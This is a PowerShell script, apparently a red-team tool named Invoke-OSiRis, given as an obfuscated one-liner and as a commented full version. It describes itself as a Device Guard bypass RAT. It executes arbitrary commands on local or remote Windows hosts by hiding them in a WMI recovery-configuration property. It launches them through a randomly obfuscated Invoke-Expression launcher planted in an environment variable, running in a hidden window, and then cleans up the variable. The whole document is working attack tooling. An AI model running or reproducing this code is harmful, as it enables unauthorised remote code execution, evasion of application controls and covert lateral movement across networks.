 #OneLinerVersion (2932 Char)
function Invoke-OSiRis{[Alias('OSiRis')]Param([Parameter(Mandatory=$false,ValueFromPipeline=$true)][Alias('Target','T')][String[]]$ComputerName=$env:ComputerName,[Parameter(Position=0,Mandatory=$true,ParameterSetname='Command')][Alias('Cmd','C')][String]$Command,[Parameter(Mandatory=$false)][Alias('U','N','Name')][String]$UserName=$env:USERNAME,[Parameter(Mandatory=$false)][Alias('P','PW','PWD')][String]$Password);Begin{$Result=@();$Creds=@{};if($Password){$Creds['Credential']=New-Object System.Management.Automation.PSCredential -A $UserName,$(ConvertTo-SecureString $Password -A -F)};$CLass='Win32_OSRecoveryConfiguration'};Process{foreach($Target in $ComputerName){if($Target -in 'LocalHost','127.0.0.1'){$Target=$env:ComputerName};if($Target -eq $env:ComputerName){$Local=$true}else{$Local=$Null};$OSiRis="Function OSiRis{`$Class='Win32_OSRecoveryConfiguration';`$OSR=Gwmi `$Class;`$Script=`$OSR.DebugFilePath;`$Reply=(iex `$Script|convertto-json) -replace `"\s+`",' ';`$OSR=Gwmi `$Class;`$OSR.DebugFilePath=`$reply;`$Null=`$OSR.put()};OSiRis";$VarName=-join (Get-Random -In ((((65..90)+(97..122)|%{[char]$_}))+(0..9)) -Count 4);$GCIRand=Get-Random -In @('Get-C`hildItem','Child`Item','G`CI','DI`R','L`S');$GCMRand=Get-Random -In @('Get-C`ommand','Co`mmand','G`CM');$InvRand=Get-Random -In @('IE`X','Inv`oke-Ex`pression',".($GCMRand ('{1}e{0}'-f'x','i'))");$EnVarRand=Get-Random -In @("($GCIRand env:$VarName).Value","`$env:$VarName");$Launcher=Get-Random -In @("$InvRand $EnVarRand","$EnVarRand|$InvRand");$ObfusK="powershell -w 1 $Launcher";if($Local){try{$OSR=Gwmi $Class}catch{};$Old=$OSR.DebugFilePath;if($Old){$OSR=Gwmi $Class;$OSR.DebugFilePath=$Command;$Null=$OSR.Put();$null=Swmi Win32_Environment -Arg @{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username};$null=Iwmi Win32_Process -EnableA -Impers 3 -Authen Packetprivacy -Name Create -Arg $ObfusK;$null=Gwmi -Q "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" | rwmi;While($((Gwmi $Class).DebugFilePath) -eq $Command){sleep 2};$Reply=(Gwmi $Class).DebugFilePath;$OSR=Gwmi $Class;$OSR.DebugFilePath=$Old;$Null=$OSR.Put()}}else{try{$OSR=Gwmi $Class -Computer $Target @Creds}catch{};$Old=$OSR.DebugFilePath;if($Old){$OSR=Gwmi $Class -Computer $Target @Creds;$OSR.DebugFilePath=$Command;$Null=$OSR.Put();$null=Swmi Win32_Environment -Arg @{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username} -Computer $Target @Creds;$null=Iwmi Win32_Process -EnableA -Impers 3 -Authen Packetprivacy -Name Create -Arg $ObfusK -Computer $Target @Creds;$null=Gwmi -Q "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -Computer $Target @Creds| rwmi;While($((Gwmi $Class -Computer $Target @Creds).DebugFilePath) -eq $Command){sleep 2};$Reply=(Gwmi $Class -Computer $Target @Creds).DebugFilePath;$OSR=Gwmi $Class -Computer $Target @Creds;$OSR.DebugFilePath=$Old;$Null=$OSR.Put()}};try{$reply=$Reply|Convertfrom-json}catch{};$Result +=$Reply}};End{Return $Result}}

<#
.Synopsis
   Device Guard Bypass Command Execution
.DESCRIPTION
   Device Guard Bypass Command execution via Win32_OSRecoveryConfiguration  
.EXAMPLE
   OSiRis "'HelloWorld'"
   Desc
   ----
   Run 'HelloWorld' on LocalHost 
.EXAMPLE
   OSiRis 1+1 -Target Blackcat
   Desc
   ----
   Do some math on remote computer 
.EXAMPLE
   OSiRis Get-Date -Target Blackcat,localhost
   Desc
   ----
   Specify multiple hosts
.EXAMPLE
   'Blackcat','localhost' | OSiRis Get-Date -U SadProcessor -P SecretPassword
   Desc
   ----
   Specify multiple hosts via pipeline & Specify Creds
.INPUTS
   Accept list of Targets via Pipeline input 
.OUTPUTS
   Outputs Lists of Strings or object Collections
.NOTES
   This Technique was made public by @ChrisTruncer in WMInplant.ps1
   https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
   Includes 'Bohannon Style' Obsfuskate Ninja Moves
.COMPONENT
   ReadTeam Tool
.ROLE
   Device Guard Bypass RAT
.FUNCTIONALITY
   Executes command on local/remote systems via WMI:
   -Get Value from Win32_OSRecoveryConfiguration DebugFilePath Property on target and store
   -Put Payload in Win32_OSRecoveryConfiguration DebugFilePath Property on target
   -Genrerates env Variable containing OSiRis Launcher
   -Set Variable on target via WMI
   -Executes launcher > Retrieve & Execute Payload > Store reply in Win32_OSRecoveryConfiguration on Target
   -Reads Win32_OSRecoveryConfiguration DebugFilePath Property from Target
   -Restore old value
   -Display Results 
   Command must be passed as string parameter
   Accepts multiple Targets
   Optional UserName/Password
#>
function Invoke-OSiRis{
    [Alias('OSiRis')]
    Param(
        # Optional Target Computer(s) | Accepts Pipeline Input (List of Targets) | Defaults to local host
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)][Alias('Target','T')][String[]]$ComputerName = $env:ComputerName,
        # Command
        [Parameter(Position=0,Mandatory=$true,ParameterSetname='Command')][Alias('Cmd','C')][String]$Command,
        # Optional UserName | Defaults to Current env UserName
        [Parameter(Mandatory=$false)][Alias('U','N','Name')][String]$UserName = $env:USERNAME,
        # Optional Password | Uses current username if password provided without -UserName switch and input
        [Parameter(Mandatory=$false)][Alias('P','PW','PWD')][String]$Password
        )
    Begin{
        ##Vars
        $Result = @()
        # If password | create creds (current user if no username input)
        $Creds = @{}
        if($Password){$Creds['Credential'] = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$(ConvertTo-SecureString $Password -AsPlainText -Force)}
        $CLass = 'Win32_OSRecoveryConfiguration'
        }
    Process{
        foreach($Target in $ComputerName){ 
            ## Prep Vars            
            #localhost names to env:Computername
            If($Target -in 'LocalHost','127.0.0.1'){$Target = $env:ComputerName}
            # Bool LocalQuery
            if($Target -eq $env:ComputerName){$Local = $true}Else{$Local = $Null}
            ##Prep Action
            ## Invoke OSiRis via env Vars + Obfusk launcher
            $OSiRis = "Function OSiRis{`$Class='Win32_OSRecoveryConfiguration';`$OSR=Gwmi `$Class;`$Script=`$OSR.DebugFilePath;`$Reply=(iex `$Script|convertto-json) -replace `"\s+`",' ';`$OSR=Gwmi `$Class;`$OSR.DebugFilePath=`$reply;`$Null =`$OSR.put()};OSiRis"
            ## Bohannon Style Obfusk Name Generator
            #random var name
            $VarName    = -join (Get-Random -In ((((65..90)+(97..122)|%{[char]$_}))+(0..9))-Count 4)
            #random Obfusk launcher
            $GCIRand    = Get-Random -In @('Get-C`hildItem','Child`Item','G`CI','DI`R','L`S')
            $GCMRand    = Get-Random -In @('Get-C`ommand','Co`mmand','G`CM')
            $InvRand    = Get-Random -In @('IE`X','Inv`oke-Ex`pression',".($GCMRand ('{1}e{0}'-f'x','i'))")
            $EnVarRand  = Get-Random -In @("($GCIRand env:$VarName).Value","`$env:$VarName")
            $Launcher      = Get-Random -In @("$InvRand $EnVarRand","$EnVarRand|$InvRand")
            # final PoSh command
            $ObfusK = "powershell -w 1 $Launcher"       
            ##MAIN
            if($Local){
                #Get Old
                try{$OSR = Gwmi $Class}catch{}
                $Old = $OSR.DebugFilePath
                if($Old){
                    #Set New
                    $OSR = Gwmi $Class
                    $OSR.DebugFilePath = $Command
                    $Null = $OSR.Put()
                    ## EnvVar Ninja Combo Move
                    # Set env Var
                    $null = Swmi Win32_Environment -Arg @{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username}
                    # Execute Obfusk Var launcher
                    $null = Iwmi Win32_Process -EnableA -Impers 3 -Authen Packetprivacy -Name Create -Arg $ObfusK       
                    # Remove Var
                    $null = Gwmi -Q "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" | rwmi
                    #Wait
                    While($((Gwmi $Class).DebugFilePath) -eq $Command){sleep 2}
                    #Get Results
                    $Reply=(Gwmi $Class).DebugFilePath
                    #Restore Old
                    $OSR = Gwmi $Class
                    $OSR.DebugFilePath = $Old
                    $Null=$OSR.Put()
                    }
                }
            Else{
                #Get Old
                try{$OSR = Gwmi $Class -Computer $Target @Creds}catch{}
                $Old = $OSR.DebugFilePath
                if($Old){
                    #Set New
                    $OSR = Gwmi $Class -Computer $Target @Creds
                    $OSR.DebugFilePath = $Command
                    $Null=$OSR.Put()
                    ## EnvVar Ninja Combo Move
                    # Set env Var
                    $null = Swmi Win32_Environment -Arg @{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username} -Computer $Target @Creds
                    # Execute Obfusk Var launcher
                    $null = Iwmi Win32_Process -EnableA -Impers 3 -Authen Packetprivacy -Name Create -Arg $ObfusK -Computer $Target @Creds     
                    # Remove Var
                    $null = Gwmi -Q "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -Computer $Target @Creds| rwmi
                    #Wait
                    While($((Gwmi $Class -Computer $Target @Creds).DebugFilePath) -eq $Command){sleep 2}
                    #Get Results
                    $Reply=(Gwmi $Class -Computer $Target @Creds).DebugFilePath
                    #Restore Old
                    $OSR = Gwmi $Class -Computer $Target @Creds
                    $OSR.DebugFilePath = $Old
                    $Null=$OSR.Put()
                    }
                }
            ## try Format Reply
            try{$reply=$Reply|Convertfrom-json}catch{}
            # Add to result
            $Result += $Reply
            }
        }
    #Return Resuts
    End{Return $Result}
    }
 
